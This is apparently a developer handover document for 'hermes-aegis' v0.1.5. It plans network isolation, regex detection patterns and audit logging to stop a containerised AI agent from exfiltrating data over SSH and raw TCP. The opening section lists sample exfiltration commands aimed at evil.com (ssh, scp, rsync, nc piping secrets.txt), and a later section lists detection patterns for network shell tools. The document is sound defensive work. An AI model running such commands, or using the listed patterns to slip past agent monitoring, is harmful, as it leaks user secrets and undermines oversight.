# SSH Defense Handover — v0.1.5

Handover document for implementing SSH/non-HTTP exfiltration defenses in hermes-aegis v0.1.5.

## The Problem

The aegis proxy intercepts HTTP/HTTPS traffic only. SSH (port 22) is a completely different protocol that bypasses the proxy entirely. An agent running inside a Docker container could:

```bash
ssh user@evil.com "cat /workspace/secrets.txt"       # exfiltrate data
scp /workspace/file user@evil.com:                    # copy files out
git push git@evil.com:repo                            # push via SSH remote
rsync -e ssh /workspace/ evil.com:/stolen/            # bulk exfiltration
curl --socks5 socks-proxy:1080 https://evil.com       # SOCKS proxy bypass
nc evil.com 4444 < /workspace/secrets.txt             # raw TCP exfiltration
```

## Current Defenses (What Already Exists)

### 1. Aegis ContainerConfig — internal network (FULL PROTECTION)
`container/builder.py` creates containers on `hermes-aegis-net` with `internal=True`. This Docker internal network has **no outbound routing** — SSH, TCP, UDP all fail. Only the proxy host is reachable via `host.docker.internal`. This is complete protection but is only used by `hermes-aegis`'s own container builder, NOT by hermes-agent's native Docker backend.

### 2. Dangerous command patterns — detection only
`patterns/dangerous.py` has patterns for shell injection but does NOT currently flag `ssh`, `scp`, `sftp`, `rsync`, `nc`, `netcat`, `socat`, or `git push git@`. These are the gap.

### 3. Hermes-agent's native Docker — NO SSH defense
`~/.hermes/hermes-agent/tools/environments/docker.py` uses default Docker networking (bridge mode with full internet access). The aegis patches forward proxy env vars and cert paths, but don't restrict the network. SSH works freely.

## The Fix — Three Layers, Zero UX Breakage

### Layer 1: Network-Level Block (New Patch)

**Add a new patch to `patches.py`** that injects `--network` restrictions into hermes-agent's Docker container startup. Two approaches, pick one:

#### Option A: Reuse aegis internal network (recommended)
Add a patch that changes the `DockerEnvironment.__init__` to use the `hermes-aegis-net` internal network when `AEGIS_ACTIVE=1`. This is the same network `container/builder.py` already creates.

```python
# Patch target: tools/environments/docker.py
# In the __init__, after all_run_args is built:
#
# Before:
#         all_run_args = list(_SECURITY_ARGS) + writable_args + resource_args + volume_args
#
# After:
#         all_run_args = list(_SECURITY_ARGS) + writable_args + resource_args + volume_args
#         # Aegis: use internal network to block non-HTTP traffic (SSH, raw TCP)
#         import os as _aegis_net_os
#         if _aegis_net_os.getenv("AEGIS_ACTIVE") == "1":
#             import subprocess as _aegis_net_sp
#             # Ensure the aegis internal network exists
#             _aegis_net_sp.run(
#                 [docker_exe, "network", "create", "--internal", "hermes-aegis-net"],
#                 capture_output=True,
#             )  # Idempotent — fails silently if exists
#             all_run_args.extend(["--network", "hermes-aegis-net",
#                                  "--add-host", "host.docker.internal:host-gateway"])
```

**Why this doesn't break UX:**
- Only activates when `AEGIS_ACTIVE=1` (set by `hermes-aegis run`)
- Running `hermes` directly (without aegis) is unaffected
- HTTP/HTTPS still works through the proxy — `host.docker.internal` is reachable
- Package installs (`pip`, `npm`, `apt`) all use HTTP and work through the proxy
- Git HTTPS works (we just fixed this in v0.1.4)

**What it blocks:**
- SSH to external hosts (no route)
- Raw TCP/UDP to external hosts (no route)
- DNS tunneling (internal network has no DNS resolver by default)

**What to watch out for:**
- The internal network needs `--add-host host.docker.internal:host-gateway` so the proxy is still reachable
- Docker Desktop on macOS handles `host.docker.internal` natively, but Linux needs the explicit `--add-host`
- Test on both macOS and Linux Docker

#### Option B: iptables rules (more surgical, more complex)
Instead of changing the whole network, inject iptables rules that block non-HTTP ports:

```bash
iptables -A OUTPUT -p tcp --dport 22 -j DROP    # block SSH
iptables -A OUTPUT -p tcp --dport 443 -j DROP   # block direct HTTPS (force proxy)
# Allow only: proxy port, DNS (53), HTTP proxy
```

**Why Option A is better:** Simpler, already proven in `container/builder.py`, and blocks ALL non-HTTP traffic rather than playing whack-a-mole with port numbers. Option B requires `NET_ADMIN` capability which the security hardening explicitly drops.

### Layer 2: Command-Level Detection (Dangerous Patterns)

**Add SSH/exfiltration patterns to `patterns/dangerous.py`:**

```python
# Add to DANGEROUS_PATTERNS list:
(r'\bssh\b', "SSH connection"),
(r'\bscp\b', "SCP file transfer"),
(r'\bsftp\b', "SFTP file transfer"),
(r'\brsync\b.*-e\s+ssh', "rsync over SSH"),
(r'\bnc\b|\bnetcat\b|\bncat\b', "netcat connection"),
(r'\bsocat\b', "socat connection"),
(r'\bgit\s+(push|fetch|pull|clone)\s+git@', "git SSH remote operation"),
(r'\bgit\s+remote\s+add\s+\S+\s+git@', "add git SSH remote"),
```

**Why this doesn't break UX:**
- These patterns are detection/audit only by default (`dangerous_commands: audit` in config)
- In gateway mode with `dangerous_commands: block`, they enforce blocking — but that's the intended behavior
- Users running interactively via `hermes` still get the approval prompt

**Important:** Don't block `git push` or `git pull` generically — only flag the `git@` SSH form. HTTPS git operations (`https://github.com/...`) should remain unblocked since they go through the proxy and are authenticated/scanned.

### Layer 3: Audit Trail Logging

Log all blocked network attempts in the audit trail. When Layer 1 (network block) prevents SSH, the connection silently fails. The agent sees a timeout or connection refused. Add audit logging so the operator knows an SSH attempt was made:

This is already handled if Layer 2 patterns are in place — the `terminal_tool_audit_forward` patch (Patch 7) forwards blocked command decisions to the aegis audit trail.

## Implementation Order

1. **Layer 2 first** (dangerous patterns) — safest, zero risk, immediate value
2. **Layer 1 second** (network patch) — requires testing on macOS + Linux Docker
3. **Layer 3 is automatic** once Layer 2 is in place

## Files to Modify

| File | Change |
|------|--------|
| `src/hermes_aegis/patterns/dangerous.py` | Add SSH/exfiltration patterns |
| `src/hermes_aegis/patches.py` | New patch: network isolation when `AEGIS_ACTIVE=1` |
| `tests/test_dangerous_blocking.py` | Test new patterns |
| `tests/test_patches.py` | Test new network patch applies/reverts cleanly |
| `README.md` | Document SSH defense in Container Isolation section |
| `CLAUDE.md` | Update patch count (9 -> 10) |

## Testing Checklist

- [ ] `ssh github.com` from inside Docker container fails (connection refused/timeout)
- [ ] `git clone git@github.com:...` fails with network error
- [ ] `git clone https://github.com/...` still works through proxy
- [ ] `npm install` still works through proxy
- [ ] `pip install` still works through proxy
- [ ] `curl https://example.com` still works through proxy
- [ ] `hermes` without `hermes-aegis run` still has full network access (no aegis interference)
- [ ] Pattern detection flags `ssh user@host` as dangerous
- [ ] Pattern detection does NOT flag `git push https://...` as dangerous
- [ ] Patch applies/reverts cleanly on hermes-agent v0.2.0
- [ ] All existing tests still pass (654+)

## What NOT to Do

- **Don't block all git operations** — only `git@` SSH remotes, not `https://` remotes
- **Don't require NET_ADMIN capability** — the security args explicitly drop all caps
- **Don't modify the container image** — patches should work with any image
- **Don't break non-aegis usage** — all changes gated on `AEGIS_ACTIVE=1`
- **Don't block localhost SSH** — `ssh localhost` for local tools is harmless in a container

## Context: How the Existing Patch System Works

See `src/hermes_aegis/patches.py`. Each patch is a `FilePatch` with:
- `name`: unique identifier
- `file`: relative path in `~/.hermes/hermes-agent/`
- `sentinel`: string that only exists in the patched form (for idempotency detection)
- `before`: exact text to find in unpatched file
- `after`: replacement text
- `critical`: if False, incompatibility is a warning not an error

Patches are applied in order (dependencies first). The `_invalidate_pyc()` helper clears `__pycache__/` after patching. Current patches target `tools/environments/docker.py` and `tools/terminal_tool.py`.

The new network patch should target `docker.py` and go after patch 3 (docker_exec_proxy_translate) since it modifies the same file's `__init__` method.
